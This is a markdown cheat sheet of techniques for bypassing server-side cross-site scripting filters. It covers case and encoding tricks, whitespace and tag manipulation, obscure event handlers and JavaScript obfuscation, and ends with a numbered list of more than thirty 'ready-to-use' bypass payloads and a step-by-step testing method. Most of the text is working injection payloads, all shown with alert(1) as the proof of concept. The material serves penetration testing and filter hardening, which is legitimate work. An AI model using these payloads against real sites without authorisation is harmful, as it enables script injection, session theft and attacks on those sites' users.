# 15 - Server-Side Filter Bypass for XSS

## Overview

Server-side XSS filters attempt to strip or neutralize malicious input before it reaches the browser. These filters range from naive regex-based blacklists to sophisticated HTML parsers. Every filter implementation introduces parsing differentials that can be exploited. This document catalogs the complete arsenal of server-side filter bypass techniques organized by category.

**Sources**: [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html), [PortSwigger XSS Cheat Sheet 2026 Edition](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), [Acunetix XSS Filter Evasion](https://www.acunetix.com/blog/articles/xss-filter-evasion-bypass-techniques/), [Edr4/XSS-Bypass-Filters](https://github.com/Edr4/XSS-Bypass-Filters)

---

## 1. Case Manipulation Techniques

### Mixed Case Variations

Filters that match lowercase patterns (e.g., `<script>`) fail against mixed-case input because HTML tags are case-insensitive in the browser parser.

```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<scRIPT>alert(1)</scrIPT>
<IMG SRC=x OnErRoR=alert(1)>
<sVg OnLoAd=alert(1)>
<bOdY oNlOaD=alert(1)>
```

### Case-Insensitive Matching Bypass

Some filters use case-insensitive regex but fail on multi-byte or Unicode equivalents:

```html
<!-- Turkish locale issue: uppercase 'i' = 'I' but lowercase 'I' = 'ı' in Turkish -->
<!-- If the server uses locale-sensitive case conversion: -->
<scrıpt>alert(1)</scrıpt>
```

### Unicode Case Folding

Unicode defines case folding rules that produce unexpected mappings. Characters outside ASCII may fold to ASCII equivalents during normalization:

```
U+FF53 U+FF43 U+FF52 U+FF49 U+FF50 U+FF54  →  "script" (fullwidth)
U+0073 U+0063 U+0072 U+0069 U+0070 U+0074  →  "script" (ASCII)
```

If a server normalizes Unicode AFTER the filter check, fullwidth characters pass the filter then become standard ASCII tags.

---

## 2. Encoding Bypass Techniques

### HTML Entity Encoding (Decimal)

```html
<!-- alert(1) using decimal entities inside event handlers -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<!-- Full tag encoding (browsers decode entities in attribute values) -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
```

### HTML Entity Encoding (Hexadecimal)

```html
<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">click</a>
<!-- Without semicolons (valid in HTML) -->
<img src=x onerror="&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29">
```

### HTML Named Entities

```html
<!-- Using &Tab; &NewLine; to break up keywords -->
<a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:alert(1)">click</a>
<a href="ja&NewLine;vascr&Tab;ipt:alert(1)">click</a>
```

### Double Encoding

When input passes through two decoding stages (e.g., URL decode then HTML decode):

```
%253Cscript%253Ealert(1)%253C/script%253E
→ first decode: %3Cscript%3Ealert(1)%3C/script%3E
→ second decode: <script>alert(1)</script>
```

### URL Encoding

```
%3Cscript%3Ealert(1)%3C/script%3E
%3Csvg%20onload%3Dalert(1)%3E
<!-- Partial encoding to evade pattern matching -->
%3Cscript>alert(1)</script%3E
```

### UTF-7 Encoding (Legacy Browsers / Misconfigured Servers)

```
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

If the server responds with `Content-Type: text/html; charset=UTF-7` or no charset and the browser sniffs UTF-7, this executes. Relevant to **CVE-2026-21876** in ModSecurity CRS where charset validation was bypassable. Source: [CRS Project](https://coreruleset.org/20260106/cve-2026-21876-critical-multipart-charset-bypass-fixed-in-crs-4.22.0-and-3.3.8/)

### Overlong UTF-8

Overlong UTF-8 sequences represent characters using more bytes than necessary. Some filters fail to normalize these:

```
< = 0xC0 0xBC (overlong 2-byte)
> = 0xC0 0xBE (overlong 2-byte)
< = 0xE0 0x80 0xBC (overlong 3-byte)
```

Modern browsers reject overlong UTF-8, but intermediary server-side parsers may decode them before passing to the browser.

### Mixed Encoding

Combine HTML entities, URL encoding, and Unicode escapes in the same payload:

```html
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074&#40;1&#41;">
<a href="&#106;avascr%69pt:alert(1)">click</a>
```

---

## 3. Tag and Attribute Manipulation

### Unknown / Custom Attributes

Browsers ignore unrecognized attributes, but filters may choke parsing on them:

```html
<img xxx=1 src=x onerror=alert(1)>
<div notreal="<script>" onclick=alert(1)>click</div>
<svg/x=">"/onload=alert(1)//>
```

### Null Bytes in Tags

Null bytes (`%00`) can terminate strings in C-based filter implementations while being stripped by browsers:

```html
<scr%00ipt>alert(1)</scr%00ipt>
<img src=x onerror%00=alert(1)>
<scri\x00pt>alert(1)</scri\x00pt>
```

**Source**: [PortSwigger - Bypassing Signature-Based XSS Filters](https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-html)

### Tab, Newline, and Carriage Return in Tags

HTML parsers treat `\t` (0x09), `\n` (0x0A), `\r` (0x0D) as whitespace within tags, but regex filters often don't account for them:

```html
<img/src=x	onerror=alert(1)>          <!-- tab between attributes -->
<svg
onload=alert(1)>                       <!-- newline before event -->
<script\x0d\x0a>alert(1)</script>      <!-- CR+LF inside tag -->
<img src=x o&#10;nerror=alert(1)>       <!-- newline entity in attr name -->
```

### Multiple Spaces and Slash Instead of Space

```html
<img     src=x     onerror=alert(1)>    <!-- multiple spaces -->
<img/src=x/onerror=alert(1)>            <!-- slash as separator -->
<svg/onload=alert(1)//                  <!-- slashes instead of closing -->
<input/onfocus=alert(1)/autofocus>      <!-- slash delimiters -->
```

### Newline in Attribute Values

```html
<img src=x onerror=a
lert(1)>
<img src=x onerror="al\
ert(1)">
```

### Self-Closing Tags and Malformed HTML

```html
<svg><script>alert&#40;1)</script>      <!-- entities inside SVG script -->
<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>
</style></mtext></svg></mglyph></table></mtext></math>
```

---

## 4. Event Handler Bypass (90+ Events)

### Commonly Filtered (but Still Useful with Encoding)

```
onclick, ondblclick, onmousedown, onmouseup, onmouseover, onmousemove,
onmouseout, onmouseenter, onmouseleave, onkeydown, onkeypress, onkeyup,
onload, onerror, onsubmit, onfocus, onblur, onchange, onresize, onscroll
```

### Less Common (Frequently Bypass Filters)

```
onwheel, oncopy, oncut, onpaste, ondrag, ondragstart, ondragend,
ondragenter, ondragleave, ondragover, ondrop, oncontextmenu,
onanimationstart, onanimationend, onanimationiteration,
ontransitionend, ontransitionstart, ontransitionrun, ontransitioncancel,
ongotpointercapture, onlostpointercapture, onpointerdown, onpointermove,
onpointerup, onpointercancel, onpointerover, onpointerout,
onpointerenter, onpointerleave, onpointerrawupdate
```

### Obscure and Rarely Filtered

```
onbeforetoggle, ontoggle, onsecuritypolicyviolation,
onscrollend, onscrollsnapchange, onscrollsnapchanging,
onwebkitanimationstart, onwebkitanimationend, onwebkitanimationiteration,
onwebkittransitionend, onsearch, oninvalid, onformdata,
onslotchange, onbeforeinput, onauxclick, onratechange,
onseeked, onseeking, onstalled, onsuspend, ontimeupdate,
onvolumechange, onwaiting, onloadeddata, onloadedmetadata,
onloadstart, oncanplay, oncanplaythrough, ondurationchange,
onemptied, onended, onplay, onplaying, onprogress,
onbeforeprint, onafterprint, onpagehide, onpageshow,
onhashchange, onpopstate, onstorage, onmessage, onmessageerror,
onrejectionhandled, onunhandledrejection, onlanguagechange,
ongamepadconnected, ongamepaddisconnected
```

### Custom Element Events

```html
<x-foo onfoo=alert(1)>          <!-- custom elements can have custom events -->
<custom-tag onclick=alert(1)>   <!-- custom element names with standard events -->
```

### Event Handler Encoding Tricks

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<body onload=al\u0065rt(1)>
<svg onload=\u0061lert(1)>
<img src=x onerror="window['alert'](1)">
```

**Source**: [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), [s0md3v/AwesomeXSS Event Handlers](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/event-handlers.md), [Infigo Novel Event Handler Techniques](https://www.infigo.is/en/insights/46/introducing-novel-event-handler-xss-techniques/)

---

## 5. JavaScript Obfuscation Techniques

### String.fromCharCode()

```javascript
// alert(1)
String.fromCharCode(97,108,101,114,116,40,49,41)
// Execute:
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
// In event handler:
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
```

### atob() Base64 Decoding

```javascript
eval(atob('YWxlcnQoMSk='))   // decodes to alert(1)
// In event handler:
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
// Nested:
[].constructor.constructor(atob('YWxlcnQoMSk='))()
```

### Template Literals (Backticks)

```javascript
`${alert(1)}`
// Tagged template:
alert`1`
// Nested:
`${`${alert(1)}`}`
// Template literal injection when reflected inside backticks:
${alert(document.domain)}
```

**Source**: [PortSwigger Template Literal Lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)

### Computed Property Access

```javascript
window['alert'](1)
window['al'+'ert'](1)
self['alert'](1)
top['alert'](1)
this['alert'](1)
globalThis['alert'](1)
frames['alert'](1)
```

### Constructor Chain

```javascript
// Function constructor:
[].constructor.constructor('alert(1)')()
// Alternative chains:
''['constructor']['constructor']('alert(1)')()
// RegExp route:
/x/['constructor']['constructor']('alert(1)')()
// Boolean route:
true['constructor']['constructor']('alert(1)')()
```

### Proxy and Reflect API

```javascript
// Using Proxy to intercept and trigger:
new Proxy({}, { get: function() { alert(1) } }).x
// Reflect.apply:
Reflect.apply(alert, null, [1])
Reflect.apply(window['al'+'ert'], null, [1])
```

### Symbol.toPrimitive

```javascript
// Object with toPrimitive triggers code on type coercion:
var x = { [Symbol.toPrimitive]: function() { alert(1) } };
x + '';  // triggers alert
```

### Additional Obfuscation

```javascript
// setTimeout/setInterval with strings:
setTimeout('alert(1)')
setInterval('alert(1)',0)
// document.write:
document.write('<script>alert(1)<\/script>')
// location assignment:
location='javascript:alert(1)'
// import():
import('data:text/javascript,alert(1)')
```

**Source**: [HackTricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting), [Tom Nom Nom Advanced XSS](https://tomnomnom.com/talks/advxss.pdf)

---

## 6. Filter Bypass Payloads (30+ Ready-to-Use)

### Basic Filter Bypass

```html
<!-- 1. Mixed case -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 2. SVG with encoded handler -->
<svg/onload=alert(1)>

<!-- 3. IMG with obscure event -->
<img src=x onpointerrawupdate=alert(1)>

<!-- 4. Body tag -->
<body/onload=alert(1)>

<!-- 5. Marquee tag -->
<marquee onstart=alert(1)>

<!-- 6. Video tag -->
<video src=x onerror=alert(1)>

<!-- 7. Audio source error -->
<audio src=x onerror=alert(1)>

<!-- 8. Details/summary -->
<details open ontoggle=alert(1)>

<!-- 9. Input autofocus -->
<input onfocus=alert(1) autofocus>

<!-- 10. Select -->
<select onfocus=alert(1) autofocus>
```

### Encoding-Based Bypass

```html
<!-- 11. HTML entity event handler -->
<img src=x onerror="&#97;lert(1)">

<!-- 12. Double URL encoding -->
%253Csvg%2520onload%253Dalert(1)%253E

<!-- 13. Hex entities without semicolons -->
<a href="&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29">X</a>

<!-- 14. Tab characters in javascript URI -->
<a href="j&#9;avascript:alert(1)">X</a>

<!-- 15. Newlines in javascript URI -->
<a href="java&#10;script:alert(1)">X</a>
```

### Obfuscation-Based Bypass

```html
<!-- 16. String.fromCharCode -->
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>

<!-- 17. atob base64 -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

<!-- 18. Constructor chain -->
<img src=x onerror="[].constructor.constructor('alert(1)')()">

<!-- 19. Template literal tag -->
<svg onload=alert`1`>

<!-- 20. Computed property access -->
<img src=x onerror="self['alert'](1)">

<!-- 21. window name trick -->
<img src=x onerror="window['al'+'ert'](1)">

<!-- 22. setTimeout string -->
<img src=x onerror=setTimeout('alert(1)')>

<!-- 23. Location assignment -->
<img src=x onerror="location='javascript:alert(1)'">
```

### Tag Manipulation Bypass

```html
<!-- 24. Slash as space -->
<svg/onload=alert(1)>

<!-- 25. Null byte in tag -->
<scr%00ipt>alert(1)</script>

<!-- 26. Tab in tag -->
<svg	onload=alert(1)>

<!-- 27. Newline in event handler attribute -->
<img src=x one
rror=alert(1)>

<!-- 28. Multiple spaces -->
<img   src=x   onerror=alert(1)>

<!-- 29. Unknown attributes before payload -->
<img xxx=1 yyy=2 src=x onerror=alert(1)>

<!-- 30. SVG namespace injection -->
<svg><script>alert&#40;1&#41;</script></svg>

<!-- 31. Math namespace -->
<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)></style></mtext></svg></mglyph></table></mtext></math>

<!-- 32. Iframe srcdoc -->
<iframe srcdoc="<script>alert(1)</script>">

<!-- 33. Object data -->
<object data="javascript:alert(1)">

<!-- 34. Embed src -->
<embed src="javascript:alert(1)">

<!-- 35. Custom element -->
<xss onclick=alert(1)>click me</xss>
```

---

## Testing Methodology

1. **Identify filter behavior**: Submit `<script>alert(1)</script>` and observe what gets stripped/encoded
2. **Test case sensitivity**: Try mixed-case variants of blocked tags and attributes
3. **Test encoding acceptance**: Submit HTML entities, URL encoding, double encoding
4. **Enumerate allowed tags**: Use PortSwigger's tag/event fuzzer to find unblocked combinations
5. **Test whitespace variants**: Insert tabs, newlines, null bytes between tag components
6. **Try alternative tags**: SVG, math, video, audio, details, marquee, input
7. **Test obscure events**: Use the comprehensive event list above
8. **Apply JS obfuscation**: String.fromCharCode, atob, constructor chains, computed access
9. **Combine techniques**: Layer multiple bypass methods in a single payload
10. **Test parser differentials**: Send payloads that server-side and browser parsers interpret differently

---

## References

- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [PortSwigger XSS Cheat Sheet - 2026 Edition](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PortSwigger - Bypassing Signature-Based XSS Filters](https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-html)
- [Acunetix - XSS Filter Evasion](https://www.acunetix.com/blog/articles/xss-filter-evasion-bypass-techniques/)
- [Edr4/XSS-Bypass-Filters GitHub](https://github.com/Edr4/XSS-Bypass-Filters)
- [SubRosa - XSS Filter Bypass Guide](https://www.subrosacyber.com/en/blog/xss-filter-bypass)
- [HackTricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [s0md3v/AwesomeXSS Event Handlers](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/event-handlers.md)
- [PayloadsAllTheThings XSS Filter Bypass](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass/)
